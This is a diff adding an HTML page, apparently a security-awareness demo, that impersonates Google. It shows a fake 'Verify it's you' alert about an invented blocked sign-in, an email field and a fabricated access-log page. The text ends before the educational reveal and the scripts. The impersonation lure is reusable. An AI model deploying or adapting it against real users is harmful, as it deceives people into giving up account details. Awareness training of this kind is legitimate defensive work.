@@ -1,0 +1,1587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!--
+  ╔══════════════════════════════════════════════════════════════════════╗
+  ║         SECURITY AWARENESS DEMONSTRATION — DanG Security             ║
+  ║         github.com/[your-handle] | dangsecurity.com                  ║
+  ║                                                                      ║
+  ║  THREE-STAGE SOCIAL ENGINEERING DEMONSTRATION                        ║
+  ║  Stage 1: False urgency / identity confirmation                      ║
+  ║  Stage 2: False authority via fabricated "privileged" access logs    ║
+  ║  Stage 3: Educational reveal with live fingerprint data              ║
+  ║                                                                      ║
+  ║  NO DATA IS COLLECTED, STORED, OR TRANSMITTED AT ANY POINT.          ║
+  ║  The email field and log checkboxes are purely cosmetic.             ║
+  ║  The IP/geo data shown on page 3 is fetched client-side and          ║
+  ║  displayed only in your browser — it goes nowhere.                   ║
+  ╚══════════════════════════════════════════════════════════════════════╝
+  -->
+  <title>Google Account</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico">
+  <!-- Public release meta — DanG Security awareness demo -->
+  <meta name="description" content="Security awareness demonstration showing how Google Sites can be abused to host convincing phishing pages on Google's own infrastructure. Created by DanG Security.">
+  <meta name="author" content="DanG Security — dangsecurity.com">
+  <meta name="robots" content="index, follow">
+  <meta property="og:title" content="This Google URL Is a Phishing Page — And That's the Point">
+  <meta property="og:description" content="A security awareness demo showing how attackers use sites.google.com/view/ to host convincing phishing campaigns on Google's own servers with valid Google TLS certs. By DanG Security.">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="This Google URL Is a Phishing Page — And That's the Point">
+  <meta name="twitter:description" content="Security awareness demo: how sites.google.com/view/access-logs can be a phishing page on Google's own infrastructure. By DanG Security.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --g-blue:    #1a73e8;
+      --g-blue-dk: #1765cc;
+      --g-red:     #d93025;
+      --g-red-dk:  #b31412;
+      --g-yellow:  #f9ab00;
+      --g-green:   #137333;
+      --g-text:    #202124;
+      --g-sub:     #5f6368;
+      --g-border:  #dadce0;
+      --g-bg:      #f8f9fa;
+      --g-white:   #ffffff;
+    }
+
+    body {
+      font-family: Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: var(--g-bg);
+      color: var(--g-text);
+      min-height: 100vh;
+    }
+
+    .hidden { display: none !important; }
+
+    /* ── SHARED: HEADER / FOOTER ─────────────────────────────────── */
+    .g-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+      background: var(--g-white);
+      border-bottom: 1px solid var(--g-border);
+    }
+
+    .g-header-links {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 13px;
+    }
+
+    .g-header-links a {
+      color: var(--g-sub);
+      text-decoration: none;
+      padding: 8px 10px;
+      border-radius: 4px;
+    }
+
+    .g-header-links a:hover { background: var(--g-bg); }
+
+    .g-header-links .btn-signin {
+      background: var(--g-blue);
+      color: white;
+      padding: 8px 18px;
+      border-radius: 4px;
+      font-weight: 500;
+      font-size: 14px;
+      margin-left: 4px;
+    }
+
+    .g-footer {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 24px;
+      font-size: 12px;
+      color: var(--g-sub);
+      background: var(--g-white);
+      border-top: 1px solid var(--g-border);
+    }
+
+    .g-footer a { color: var(--g-sub); text-decoration: none; margin: 0 10px; }
+    .g-footer a:hover { text-decoration: underline; }
+
+    /* ── SHARED: BUTTONS ─────────────────────────────────────────── */
+    .btn-ghost {
+      background: none;
+      border: none;
+      font-family: Roboto, Arial, sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--g-blue);
+      cursor: pointer;
+      padding: 8px 4px;
+    }
+
+    .btn-ghost:hover { text-decoration: underline; }
+
+    .btn-primary {
+      background: var(--g-blue);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: Roboto, Arial, sans-serif;
+      cursor: pointer;
+      letter-spacing: .25px;
+      transition: background .15s, box-shadow .15s;
+    }
+
+    .btn-primary:hover { background: var(--g-blue-dk); box-shadow: 0 2px 6px rgba(0,0,0,.2); }
+
+    .btn-danger {
+      background: var(--g-red);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: Roboto, Arial, sans-serif;
+      cursor: pointer;
+      letter-spacing: .25px;
+      transition: background .15s, box-shadow .15s;
+    }
+
+    .btn-danger:hover { background: var(--g-red-dk); box-shadow: 0 2px 6px rgba(0,0,0,.25); }
+
+    /* ── LOADING OVERLAY ─────────────────────────────────────────── */
+    #loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,.92);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 200;
+    }
+
+    .g-spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #e8eaed;
+      border-top-color: var(--g-blue);
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    #loading-overlay p { font-size: 14px; color: var(--g-sub); }
+
+
+    /* ═══════════════════════════════════════════════════════════════
+       PAGE 1 — PHISHING SIMULATION (Stage 1: Urgency + Email)
+       ═══════════════════════════════════════════════════════════════ */
+    #page-phish {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .phish-body {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 32px 16px 48px;
+    }
+
+    .phish-card {
+      background: var(--g-white);
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(60,64,67,.15), 0 1px 2px rgba(60,64,67,.3);
+      width: 100%;
+      max-width: 448px;
+      padding: 44px 40px 36px;
+    }
+
+    .critical-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #fce8e6;
+      color: #c5221f;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .6px;
+      text-transform: uppercase;
+      padding: 4px 10px;
+      border-radius: 12px;
+      margin-bottom: 14px;
+    }
+
+    .phish-card h1 { font-size: 24px; font-weight: 400; margin-bottom: 6px; }
+    .phish-card .subline { font-size: 14px; color: var(--g-sub); margin-bottom: 22px; line-height: 1.5; }
+
+    .activity-block {
+      border: 1px solid #fdd;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 22px;
+    }
+
+    .activity-block-header {
+      background: #fce8e6;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #c5221f;
+    }
+
+    .activity-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 9px 14px;
+      font-size: 13px;
+      border-top: 1px solid #f3e0e0;
+      background: #fff9f9;
+    }
+
+    .activity-row .label { color: var(--g-sub); }
+    .activity-row .value { color: var(--g-text); font-weight: 500; }
+
+    /* Floating label input */
+    .field-group { position: relative; margin-bottom: 14px; }
+
+    .field-input {
+      width: 100%;
+      height: 56px;
+      border: 1px solid var(--g-border);
+      border-radius: 4px;
+      padding: 20px 14px 6px;
+      font-size: 16px;
+      font-family: Roboto, Arial, sans-serif;
+      color: var(--g-text);
+      background: transparent;
+      outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+
+    .field-input:focus { border-color: var(--g-blue); box-shadow: 0 0 0 1px var(--g-blue); }
+
+    .field-label {
+      position: absolute;
+      top: 18px;
+      left: 14px;
+      font-size: 16px;
+      color: #80868b;
+      pointer-events: none;
+      transition: top .15s, font-size .15s, color .15s;
+    }
+
+    .field-input:focus ~ .field-label,
+    .field-input:not(:placeholder-shown) ~ .field-label {
+      top: 7px;
+      font-size: 12px;
+      color: var(--g-blue);
+    }
+
+    .field-input:not(:focus):not(:placeholder-shown) ~ .field-label {
+      color: var(--g-sub);
+    }
+
+    /* Auth deferral note */
+    .auth-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #e8f0fe;
+      border-radius: 6px;
+      padding: 13px 14px;
+      margin-bottom: 4px;
+    }
+
+    .auth-note svg { flex-shrink: 0; margin-top: 1px; }
+
+    .auth-note-text { font-size: 13px; line-height: 1.6; color: #185abc; }
+    .auth-note-text strong { display: block; font-weight: 500; margin-bottom: 2px; color: #174ea6; }
+
+    .form-actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 28px;
+    }
+
+
+    /* ═══════════════════════════════════════════════════════════════
+       PAGE 2 — FAKE ACCESS LOGS (Stage 2: False Authority)
+       ═══════════════════════════════════════════════════════════════ */
+    #page-logs {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Breadcrumb-style subheader */
+    .logs-subheader {
+      background: var(--g-white);
+      border-bottom: 1px solid var(--g-border);
+      padding: 10px 24px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--g-sub);
+    }
+
+    .logs-subheader a { color: var(--g-blue); text-decoration: none; }
+    .logs-subheader a:hover { text-decoration: underline; }
+    .logs-subheader .sep { color: #bdc1c6; }
+
+    .logs-body {
+      flex: 1;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 28px 20px 48px;
+      width: 100%;
+    }
+
+    /* Page title row */
+    .logs-title-row {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .logs-title-row h1 { font-size: 22px; font-weight: 400; color: var(--g-text); }
+    .logs-title-row .subtitle { font-size: 13px; color: var(--g-sub); margin-top: 4px; line-height: 1.5; }
+
+    /* Account chip — shows their entered email */
+    .account-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--g-white);
+      border: 1px solid var(--g-border);
+      border-radius: 20px;
+      padding: 6px 14px 6px 8px;
+      font-size: 13px;
+      color: var(--g-text);
+      white-space: nowrap;
+    }
+
+    .account-chip .avatar {
+      width: 24px;
+      height: 24px;
+      background: var(--g-blue);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: white;
+      flex-shrink: 0;
+    }
+
+    /* Alert banner above table */
+    .logs-alert {
+      background: #fef9e7;
+      border: 1px solid #f9ab00;
+      border-radius: 8px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      line-height: 1.6;
+      color: var(--g-text);
+    }
+
+    .logs-alert svg { flex-shrink: 0; margin-top: 1px; }
+
+    /* Table card */
+    .logs-card {
+      background: var(--g-white);
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(60,64,67,.1);
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .logs-card-header {
+      padding: 14px 20px;
+      border-bottom: 1px solid #e8eaed;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 14px;
+    }
+
+    .logs-card-header span { color: var(--g-sub); }
+
+    .logs-card-header strong { color: var(--g-text); }
+
+    .logs-table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    .logs-table thead th {
+      padding: 11px 16px;
+      text-align: left;
+      font-size: 11px;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: .6px;
+      color: var(--g-sub);
+      border-bottom: 1px solid #e8eaed;
+      background: #fafafa;
+      white-space: nowrap;
+    }
+
+    .logs-table thead th:first-child { width: 44px; padding-left: 20px; }
+
+    .logs-table tbody tr {
+      transition: background .1s;
+      cursor: default;
+    }
+
+    .logs-table tbody tr:hover { background: #f8f9fa; }
+
+    .logs-table tbody tr.suspicious-row { background: #fff3f2; }
+    .logs-table tbody tr.suspicious-row:hover { background: #fce8e6; }
+    .logs-table tbody tr.suspicious-row td:first-child {
+      border-left: 3px solid var(--g-red);
+    }
+
+    .log-ip {
+      font-family: 'Roboto Mono', monospace;
+      font-size: 11px;
+      color: var(--g-sub);
+      margin-top: 2px;
+    }
+
+    .logs-table tbody td {
+      padding: 13px 16px;
+      font-size: 13px;
+      color: var(--g-text);
+      border-bottom: 1px solid #f1f3f4;
+      vertical-align: middle;
+    }
+
+    .logs-table tbody td:first-child { padding-left: 20px; }
+    .logs-table tbody tr:last-child td { border-bottom: none; }
+
+    /* Custom checkbox */
+    .log-checkbox {
+      width: 18px;
+      height: 18px;
+      accent-color: var(--g-blue);
+      cursor: pointer;
+    }
+
+    .log-time { color: var(--g-sub); white-space: nowrap; }
+    .log-time .date { font-size: 11px; }
+
+    .log-device { font-weight: 500; }
+    .log-device .sub { font-weight: 400; font-size: 12px; color: var(--g-sub); margin-top: 1px; }
+
+    .log-location { white-space: nowrap; }
+
+    /* Status badges */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: 500;
+      white-space: nowrap;
+    }
+
+    .badge-verified  { background: #e6f4ea; color: #137333; }
+    .badge-blocked   { background: #fce8e6; color: #c5221f; }
+    .badge-unknown   { background: #fef9e7; color: #b06000; }
+
+    /* Selection summary bar */
+    .selection-bar {
+      background: var(--g-white);
+      border: 1px solid var(--g-border);
+      border-radius: 8px;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+      font-size: 14px;
+    }
+
+    .selection-bar .sel-info { color: var(--g-sub); }
+    .selection-bar .sel-count { font-weight: 500; color: var(--g-text); }
+
+    .selection-bar .sel-actions { display: flex; gap: 12px; align-items: center; }
+
+    /* Privacy note at bottom of logs page */
+    .logs-privacy {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      color: var(--g-sub);
+      padding: 0 4px;
+      margin-top: 12px;
+    }
+
+
+    /* ═══════════════════════════════════════════════════════════════
+       PAGE 3 — SECURITY AWARENESS REVEAL
+       ═══════════════════════════════════════════════════════════════ */
+    #page-reveal {
+      min-height: 100vh;
+      background: var(--g-bg);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .reveal-banner {
+      background: linear-gradient(135deg, #8b0000 0%, var(--g-red-dk) 40%, var(--g-red) 100%);
+      color: white;
+      text-align: center;
+      padding: 36px 24px;
+    }
+
+    .reveal-banner .stop-icon { font-size: 56px; line-height: 1; margin-bottom: 14px; display: block; }
+    .reveal-banner h1 { font-size: 28px; font-weight: 700; margin-bottom: 12px; letter-spacing: -.3px; }
+    .reveal-banner p { font-size: 15px; line-height: 1.7; max-width: 640px; margin: 0 auto; opacity: .92; }
+    .reveal-banner strong { opacity: 1; font-weight: 700; }
+
+    /* Stage indicator pills */
+    .stage-pills {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 20px;
+    }
+
+    .stage-pill {
+      background: rgba(255,255,255,.15);
+      border: 1px solid rgba(255,255,255,.3);
+      border-radius: 20px;
+      padding: 5px 14px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .reveal-content {
+      flex: 1;
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 32px 16px 48px;
+      width: 100%;
+    }
+
+    /* Reveal cards */
+    .rcard {
+      background: var(--g-white);
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(60,64,67,.1);
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+
+    .rcard-head {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 16px 24px;
+      border-bottom: 1px solid #e8eaed;
+    }
+
+    .rcard-head .icon { font-size: 20px; line-height: 1; }
+    .rcard-head h2 { font-size: 16px; font-weight: 500; color: var(--g-text); }
+
+    .rcard-head .chip {
+      margin-left: auto;
+      background: #fce8e6;
+      color: #c5221f;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+      padding: 3px 8px;
+      border-radius: 10px;
+    }
+
+    .rcard-body { padding: 24px; }
+
+    .section-intro {
+      font-size: 14px;
+      color: var(--g-sub);
+      line-height: 1.7;
+      margin-bottom: 20px;
+    }
+
+    /* Fingerprint data grid */
+    .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 10px; }
+
+    .dtile { background: var(--g-bg); border-radius: 6px; padding: 11px 14px; border-left: 3px solid var(--g-red); }
+    .dtile-label { font-size: 10px; font-weight: 500; text-transform: uppercase; letter-spacing: .8px; color: var(--g-sub); margin-bottom: 4px; }
+    .dtile-value { font-size: 13px; font-family: 'Roboto Mono', monospace; color: var(--g-text); word-break: break-all; line-height: 1.4; }
+    .dtile-value.pending { color: #9aa0a6; font-style: italic; font-family: Roboto, Arial, sans-serif; }
+
+    /* Psych mechanics grid */
+    .psych-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
+
+    .psych-tile {
+      background: var(--g-bg);
+      border-radius: 8px;
+      padding: 18px 20px;
+      border-top: 3px solid var(--g-blue);
+    }
+
+    .psych-tile h3 { font-size: 14px; font-weight: 500; margin-bottom: 6px; color: var(--g-text); }
+    .psych-tile .mechanic-label {
+      display: inline-block;
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .6px;
+      color: var(--g-blue);
+      background: #e8f0fe;
+      padding: 2px 8px;
+      border-radius: 10px;
+      margin-bottom: 8px;
+    }
+
+    .psych-tile p { font-size: 13px; color: var(--g-sub); line-height: 1.65; }
+
+    /* Code block */
+    .code-wrap { background: #1e1e2e; border-radius: 8px; overflow: hidden; }
+
+    .code-toolbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: #181825;
+    }
+
+    .code-toolbar span { font-size: 12px; color: #6c7086; font-family: 'Roboto Mono', monospace; }
+    .code-toolbar .dots { display: flex; gap: 6px; }
+    .code-toolbar .dot { width: 12px; height: 12px; border-radius: 50%; }
+    .dot-r { background: #f38ba8; }
+    .dot-y { background: #f9e2af; }
+    .dot-g { background: #a6e3a1; }
+
+    .code-block {
+      padding: 20px 24px;
+      font-family: 'Roboto Mono', 'Courier New', monospace;
+      font-size: 12.5px;
+      line-height: 1.85;
+      overflow-x: auto;
+      color: #cdd6f4;
+    }
+
+    .c-cm { color: #585b70; }
+    .c-kw { color: #cba6f7; }
+    .c-fn { color: #89b4fa; }
+    .c-st { color: #a6e3a1; }
+    .c-nm { color: #fab387; }
+    .c-op { color: #89dceb; }
+    .c-hl { color: #f38ba8; }
+
+    /* URL comparison */
+    .url-compare { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .url-box { border-radius: 8px; border: 1px solid #e8eaed; overflow: hidden; }
+    .url-box-head { padding: 9px 14px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; }
+    .url-box.legit .url-box-head { background: #e6f4ea; color: #137333; }
+    .url-box.phish .url-box-head { background: #fce8e6; color: #c5221f; }
+    .url-box-body { padding: 14px; font-family: 'Roboto Mono', monospace; font-size: 12px; line-height: 2; background: #fafafa; }
+    .hl-g { background: #e6f4ea; color: #137333; padding: 1px 4px; border-radius: 3px; font-weight: 500; }
+    .hl-r { background: #fce8e6; color: #c5221f; padding: 1px 4px; border-radius: 3px; font-weight: 500; }
+
+    .url-callout {
+      font-size: 13px;
+      line-height: 1.6;
+      padding: 12px 16px;
+      background: #fff8e1;
+      border-left: 3px solid #f9ab00;
+      border-radius: 0 6px 6px 0;
+      margin-top: 16px;
+    }
+
+    /* Attack anatomy steps */
+    .steps { display: flex; flex-direction: column; gap: 20px; }
+    .step { display: flex; gap: 16px; align-items: flex-start; }
+    .step-num { width: 30px; height: 30px; min-width: 30px; background: var(--g-blue); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; }
+    .step-num.red { background: var(--g-red); }
+    .step-body strong { font-size: 15px; font-weight: 500; display: block; margin-bottom: 4px; }
+    .step-body p { font-size: 13px; color: var(--g-sub); line-height: 1.65; }
+    .step-body code { background: #f1f3f4; padding: 1px 5px; border-radius: 3px; font-family: 'Roboto Mono', monospace; font-size: 12px; color: var(--g-text); }
+
+    /* Protection list */
+    .protect-list { list-style: none; }
+    .protect-item { display: flex; gap: 16px; align-items: flex-start; padding: 16px 0; border-bottom: 1px solid #f1f3f4; }
+    .protect-item:last-child { border-bottom: none; }
+    .protect-icon { font-size: 24px; flex-shrink: 0; margin-top: 1px; }
+    .protect-item h3 { font-size: 14px; font-weight: 500; margin-bottom: 3px; }
+    .protect-item p { font-size: 13px; color: var(--g-sub); line-height: 1.6; }
+    .protect-item code { background: #f1f3f4; padding: 1px 5px; border-radius: 3px; font-family: 'Roboto Mono', monospace; font-size: 12px; color: var(--g-text); }
+
+    .attrib { text-align: center; padding: 24px 16px; font-size: 13px; color: var(--g-sub); border-top: 1px solid #e8eaed; line-height: 1.7; }
+    .attrib a { color: var(--g-blue); text-decoration: none; font-weight: 500; }
+    .attrib a:hover { text-decoration: underline; }
+
+    @media (max-width: 700px) {
+      .phish-card { padding: 28px 20px 24px; }
+      .url-compare { grid-template-columns: 1fr; }
+      .data-grid { grid-template-columns: 1fr 1fr; }
+      .psych-grid { grid-template-columns: 1fr; }
+      .rcard-body { padding: 16px; }
+      .logs-table thead { display: none; }
+      .logs-table tbody td { display: block; padding: 4px 16px; }
+      .logs-table tbody td:first-child { padding-top: 12px; }
+      .logs-table tbody td:last-child { padding-bottom: 12px; }
+      .logs-table tbody td::before { content: attr(data-label); font-size: 10px; text-transform: uppercase; letter-spacing: .5px; color: var(--g-sub); display: block; margin-bottom: 2px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOADING OVERLAY -->
+<div id="loading-overlay" class="hidden">
+  <div class="g-spinner"></div>
+  <p id="loading-msg">Verifying your identity…</p>
+</div>
+
+
+<!-- ══════════════════════════════════════════════════════════════════════
+     PAGE 1 — STAGE 1: URGENCY + IDENTITY CONFIRMATION
+     No data is captured here. The email field value is only used on
+     the next page to display back to the user for psychological effect.
+     ══════════════════════════════════════════════════════════════════════ -->
+<div id="page-phish">
+  <header class="g-header">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+         alt="Google" style="height:24px;">
+    <nav class="g-header-links">
+      <a href="#">Gmail</a>
+      <a href="#">Images</a>
+      <a href="#" class="btn-signin">Sign in</a>
+    </nav>
+  </header>
+
+  <main class="phish-body">
+    <div class="phish-card">
+      <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+           alt="Google" style="height:24px;margin-bottom:28px;display:block;">
+
+      <div class="critical-badge">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+        </svg>
+        Critical security alert
+      </div>
+
+      <h1>Verify it's you</h1>
+      <p class="subline">Google blocked a suspicious sign-in attempt to your account.</p>
+
+      <div class="activity-block">
+        <div class="activity-block-header">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+          </svg>
+          Blocked sign-in attempt
+        </div>
+        <div class="activity-row">
+          <span class="label">Location</span>
+          <span class="value">Lagos, Nigeria 🇳🇬</span>
+        </div>
+        <div class="activity-row">
+          <span class="label">Device</span>
+          <span class="value">Unknown Windows PC</span>
+        </div>
+        <div class="activity-row">
+          <span class="label">Time</span>
+          <span class="value" id="fake-time">Loading…</span>
+        </div>
+        <div class="activity-row">
+          <span class="label">App</span>
+          <span class="value">Google Drive 📁</span>
+        </div>
+      </div>
+
+      <p style="font-size:13px;color:var(--g-sub);line-height:1.65;margin-bottom:18px;">
+        To protect your account and files, confirm your identity. If this wasn't you,
+        we'll pull your recent access logs so you can review and flag the activity.
+      </p>
+
+      <div class="field-group">
+        <input type="email" class="field-input" id="fake-email" placeholder=" " autocomplete="email">
+        <label class="field-label" for="fake-email">Email or phone</label>
+      </div>
+
+      <div class="auth-note">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" style="flex-shrink:0;margin-top:1px;color:#185abc" aria-hidden="true">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+        </svg>
+        <div class="auth-note-text">
+          <strong>For your security, password entry never happens on verification pages.</strong>
+          You'll authenticate directly with Google's servers after reviewing your account activity.
+        </div>
+      </div>
+
+      <div class="form-actions">
+        <button class="btn-ghost" type="button">Use another account</button>
+        <button class="btn-danger" type="button" onclick="showAccessLogs()">Review My Activity →</button>
+      </div>
+    </div>
+  </main>
+
+  <footer class="g-footer">
+    <span>English (United States)</span>
+    <nav><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav>
+  </footer>
+</div>
+
+
+<!-- ══════════════════════════════════════════════════════════════════════
+     PAGE 2 — STAGE 2: FALSE AUTHORITY VIA FABRICATED ACCESS LOGS
+     The log entries are generated from real browser fingerprint data
+     to make "familiar" rows feel personalized.
+     The email entered on page 1 is displayed in the account chip.
+     Nothing is submitted or transmitted anywhere.
+     ══════════════════════════════════════════════════════════════════════ -->
+<div id="page-logs" class="hidden">
+  <header class="g-header">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+         alt="Google" style="height:24px;">
+    <nav class="g-header-links">
+      <a href="#">Gmail</a>
+      <a href="#">Images</a>
+      <a href="#" class="btn-signin">Sign in</a>
+    </nav>
+  </header>
+
+  <!-- Breadcrumb -->
+  <div class="logs-subheader">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" style="color:#5f6368" aria-hidden="true">
+      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+    </svg>
+    <a href="#">Google Account</a>
+    <span class="sep">›</span>
+    <a href="#">Security</a>
+    <span class="sep">›</span>
+    <span>Recent Access Logs</span>
+  </div>
+
+  <main class="logs-body">
+    <div class="logs-title-row">
+      <div>
+        <h1>Recent Account Activity</h1>
+        <p class="subtitle">Review the events below. Select any activity you don't recognize, then click <strong>Report Selected Activity</strong>.</p>
+      </div>
+      <div class="account-chip" id="account-chip">
+        <div class="avatar" id="account-avatar">?</div>
+        <span id="account-email-display">Loading…</span>
+      </div>
+    </div>
+
+    <!-- Urgency callout -->
+    <div class="logs-alert">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="#f9ab00" aria-hidden="true">
+        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+      </svg>
+      <div>
+        <strong>2 events require your attention.</strong> A sign-in attempt to your Google Drive
+        was blocked moments ago. There is also an unrecognized event from a few days prior.
+        Review the activity below and check anything you don't recognize.
+      </div>
+    </div>
+
+    <!-- Log table -->
+    <div class="logs-card">
+      <div class="logs-card-header">
+        <strong>Access Events</strong>
+        <span>Last 30 days · All devices</span>
+      </div>
+      <table class="logs-table" id="logs-table">
+        <thead>
+          <tr>
+            <th></th>
+            <th>Time</th>
+            <th>Device &amp; Browser</th>
+            <th>Location</th>
+            <th>Sign-in Method</th>
+            <th>Status</th>
+          </tr>
+        </thead>
+        <tbody id="logs-tbody">
+          <!-- Populated by JS -->
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Selection bar -->
+    <div class="selection-bar">
+      <div>
+        <span class="sel-info">Selected: </span>
+        <span class="sel-count" id="sel-count">0 events</span>
+        <span class="sel-info"> selected</span>
+      </div>
+      <div class="sel-actions">
+        <button class="btn-ghost" type="button" onclick="selectNone()">Clear selection</button>
+        <button class="btn-danger" type="button" onclick="triggerReveal()">Report Selected Activity →</button>
+      </div>
+    </div>
+
+    <div class="logs-privacy">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" style="color:#5f6368;flex-shrink:0" aria-hidden="true">
+        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+      </svg>
+      IP addresses for unrecognized events are partially masked pending investigation. Your own device activity is shown in full.
+    </div>
+  </main>
+
+  <footer class="g-footer">
